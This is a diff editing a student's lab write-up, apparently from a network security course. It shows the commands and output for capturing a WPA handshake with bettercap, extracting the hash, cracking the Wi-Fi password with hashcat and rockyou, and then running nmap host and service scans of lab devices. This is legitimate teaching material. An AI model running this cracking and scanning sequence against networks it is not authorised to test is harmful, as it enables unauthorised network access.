@@ -4,6 +4,7 @@
 
 ## Connecting to the Workstation
 
+
 ```
  $ ssh kali@edie.cs.pdx.edu -i edie -J sawyeras@linux.cs.pdx.edu 
 ```
@@ -19,7 +20,8 @@ When I put the card back into managed mode and then into monitor mode again, it 
  $ sudo airmon-ng start wlan0
 ```
 
-## `bettercap`
+## Capturing the Handshake
+
 
 ```
  $ sudo bettercap --iface wlan0mon
@@ -59,9 +61,11 @@ When I put the card back into managed mode and then into monitor mode again, it 
 
  > exit
 ```
-## `hcx` and `hashcat`
+
+## Getting the Hash
+
 ```
- $ sudo cp bettercap-wifi-handshakes.pcap .
+ $ sudo cp /root/bettercap-wifi-handshakes.pcap .
  $ hcxpcapngtool bettercap-wifi-handshakes.pcap -o hash
 hcxpcapngtool 6.2.7 reading from bettercap-wifi-handshakes.pcap...
 
@@ -98,25 +102,7 @@ frequency statistics from radiotap header (frequency: received packets)
 -----------------------------------------------------------------------
  5240: 18
 
-Warning: out of sequence timestamps!
-This dump file contains frames with out of sequence timestamps.
-That is a bug of the capturing tool.
-
-Information: limited dump file format detected!
-This file format is a very basic format to save captured network data.
-It is recommended to use PCAP Next Generation dump file format (or pcapng for short) instead.
-The PCAP Next Generation dump file format is an attempt to overcome the limitations
-of the currently widely used (but limited) libpcap (cap, pcap) format.
-https://www.wireshark.org/docs/wsug_html_chunked/AppFiles.html#ChAppFilesCaptureFilesSection
-https://github.com/pcapng/pcapng
-
-Information: missing frames!
-This dump file does not contain undirected proberequest frames.
-An undirected proberequest may contain information about the PSK.
-It always happens if the capture file was cleaned or
-it could happen if filter options are used during capturing.
-That makes it hard to recover the PSK.
-
+...
 
 session summary
 ---------------
@@ -124,45 +110,33 @@ processed cap files...................: 1
 
  $ cat hash
 WPA*02*9b76ab0370df3edfba60aa1b710fa1d1*2887ba757e93*70f754ff1c59*4e6574536563*6dd1e3804119dbd3f644d568fd3a01911202e3c04b13a0638f60692520cd5d9d*0103007502010a00000000000000000001f0009806c80f02dccda6cee2e553e535ddb668774f3893b67888171ebc16257e000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001630140100000fac040100000fac040100000fac028000*02 
+```
 
+## Cracking the Hash
+
+The `hashcat` man pages said that the code for WPA/WPA2 was 2500, so I started with that. 
+
+```
  $ hashcat -m 2500 hash /usr/share/wordlists/rockyou.txt.qz
 
 OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
 ==================================================================================================================================================
-* Device #1: cpu-haswell-Intel(R) Xeon(R) CPU E3-1241 v3 @ 3.50GHz, 6915/13895 MB (2048 MB allocatable), 8MCU
-
-Minimum password length supported by kernel: 8
-Maximum password length supported by kernel: 63
-
+...
 The plugin 2500 is deprecated and was replaced with plugin 22000. For more details, please read: https://hashcat.net/forum/thread-10253.html
-
-Started: Sat May 18 19:23:58 2024
-Stopped: Sat May 18 19:23:59 2024
-[1]    192526 exit 255   hashcat -m 2500 hash /usr/share/wordlists/rockyou.txt.gz
+...
 
  $ hashcat -m 22000 hash /usr/share/wordlists/rockyou.txt.gz
 hashcat (v6.2.6) starting
 
 OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
 ==================================================================================================================================================
-* Device #1: cpu-haswell-Intel(R) Xeon(R) CPU E3-1241 v3 @ 3.50GHz, 6915/13895 MB (2048 MB allocatable), 8MCU
-
-Minimum password length supported by kernel: 8
-Maximum password length supported by kernel: 63
+...
 
 Hashes: 1 digests; 1 unique digests, 1 unique salts
 Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
 Rules: 1
 
-Optimizers applied:
-* Zero-Byte
-* Single-Hash
-* Single-Salt
-* Slow-Hash-SIMD-LOOP
-
-Watchdog: Temperature abort trigger set to 90c
-
-Host memory required for this attack: 2 MB
+...
 
 Dictionary cache built:
 * Filename..: /usr/share/wordlists/rockyou.txt.gz
@@ -200,6 +174,7 @@ Stopped: Sat May 18 19:32:13 2024
 ```
 
 ## Connecting
+
 `nmcli` wouldn't connect to `NetSec` until after I did the `nmcli device wifi` command
 
 ```
@@ -224,7 +199,6 @@ Device 'wlan0' successfully activated with '52796feb-4833-46c6-b196-8e18e42f8bb6
 ![Connected to NetSec](./img/connection.png)
 
 # Nmap
-I didn't scan the clients that were other workstations (i.e ivan and edie from above)
 
 ```
  $ ip a s
@@ -235,6 +209,7 @@ I didn't scan the clients that were other workstations (i.e ivan and edie from a
        valid_lft 5019sec preferred_lft 5019sec
     inet6 fe80::78d:a2e3:8c5a:3175/64 scope link noprefixroute
        valid_lft forever preferred_lft forever
+
  $ sudo nmap -sn 192.168.0.187/24
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-18 20:20 PDT
 Nmap scan report for Archer (192.168.0.1)
@@ -255,46 +230,49 @@ MAC Address: E4:5F:01:91:0C:52 (Raspberry Pi Trading)
 Nmap scan report for edie (192.168.0.187)
 Host is up.
 Nmap done: 256 IP addresses (6 hosts up) scanned in 1.90 seconds
+```
 
- $ sudo nmap 192.168.0.47
-sudo nmap -sV 192.168.0.47
-Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-18 20:24 PDT
+I didn't scan the clients that were other workstations (i.e ivan and edie from above)
+
+```
+ $ cat cli.txt
+192.168.0.47
+192.168.0.139
+192.168.0.240
+
+ $ sudo nmap -sT -sV -iL cli.txt
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-20 11:45 PDT
 Nmap scan report for Khadas (192.168.0.47)
-Host is up (0.0079s latency).
-Not shown: 998 closed tcp ports (reset)
+Host is up (0.0098s latency).
+Not shown: 998 closed tcp ports (conn-refused)
 PORT    STATE SERVICE VERSION
 22/tcp  open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
 631/tcp open  ipp     CUPS 2.4
 MAC Address: 70:F7:54:FF:1C:59 (Ampak Technology)
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 6.75 seconds
-
- $ sudo nmap -sV 192.168.0.139
-Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-18 20:25 PDT
-Nmap scan report for bookworm (192.168.0.139)
-Host is up (0.0056s latency).
-Not shown: 997 closed tcp ports (reset)
+Nmap scan report for 192.168.0.139
+Host is up (0.013s latency).
+Not shown: 997 closed tcp ports (conn-refused)
 PORT     STATE SERVICE         VERSION
 22/tcp   open  ssh             OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
 1935/tcp open  rtmp?
 8888/tcp open  sun-answerbook?
 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
-SF-Port8888-TCP:V=7.94SVN%I=7%D=5/18%Time=6649713A%P=x86_64-pc-linux-gnu%r
+SF-Port8888-TCP:V=7.94SVN%I=7%D=5/20%Time=664B9A34%P=x86_64-pc-linux-gnu%r
 SF:(GetRequest,D9,"HTTP/1\.0\x20404\x20Not\x20Found\r\nAccess-Control-Allo
 SF:w-Credentials:\x20true\r\nAccess-Control-Allow-Origin:\x20\*\r\nContent
-SF:-Type:\x20text/plain\r\nServer:\x20mediamtx\r\nDate:\x20Fri,\x2017\x20M
-SF:ay\x202024\x2010:30:05\x20GMT\r\nContent-Length:\x2018\r\n\r\n404\x20pa
+SF:-Type:\x20text/plain\r\nServer:\x20mediamtx\r\nDate:\x20Sun,\x2019\x20M
+SF:ay\x202024\x2001:49:30\x20GMT\r\nContent-Length:\x2018\r\n\r\n404\x20pa
 SF:ge\x20not\x20found")%r(HTTPOptions,FA,"HTTP/1\.0\x20204\x20No\x20Conten
 SF:t\r\nAccess-Control-Allow-Credentials:\x20true\r\nAccess-Control-Allow-
 SF:Headers:\x20Authorization,\x20Range\r\nAccess-Control-Allow-Methods:\x2
 SF:0OPTIONS,\x20GET\r\nAccess-Control-Allow-Origin:\x20\*\r\nServer:\x20me
-SF:diamtx\r\nDate:\x20Fri,\x2017\x20May\x202024\x2010:30:05\x20GMT\r\n\r\n
+SF:diamtx\r\nDate:\x20Sun,\x2019\x20May\x202024\x2001:49:30\x20GMT\r\n\r\n
 SF:")%r(FourOhFourRequest,DD,"HTTP/1\.0\x20301\x20Moved\x20Permanently\r\n
 SF:Access-Control-Allow-Credentials:\x20true\r\nAccess-Control-Allow-Origi
 SF:n:\x20\*\r\nLocation:\x20/nice\x20ports,/Trinity\.txt\.bak/\r\nServer:\
-SF:x20mediamtx\r\nDate:\x20Fri,\x2017\x20May\x202024\x2010:30:05\x20GMT\r\
+SF:x20mediamtx\r\nDate:\x20Sun,\x2019\x20May\x202024\x2001:49:30\x20GMT\r\
 SF:nContent-Length:\x200\r\n\r\n")%r(LSCP,67,"HTTP/1\.1\x20400\x20Bad\x20R
 SF:equest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\
 SF:x20close\r\n\r\n400\x20Bad\x20Request")%r(GenericLines,67,"HTTP/1\.1\x2
@@ -314,21 +292,16 @@ SF:rset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request");
 MAC Address: D8:3A:DD:7E:3C:31 (Unknown)
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 87.72 seconds
-
- $ sudo nmap -sV 192.168.0.240
-Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-18 20:28 PDT
 Nmap scan report for reterm-i (192.168.0.240)
-Host is up (0.0068s latency).
-Not shown: 999 closed tcp ports (reset)
+Host is up (0.017s latency).
+Not shown: 999 closed tcp ports (conn-refused)
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
 MAC Address: E4:5F:01:91:0C:52 (Raspberry Pi Trading)
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+ 
+...
 
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 0.66 seconds
 ```
 
 # RTSP Stream
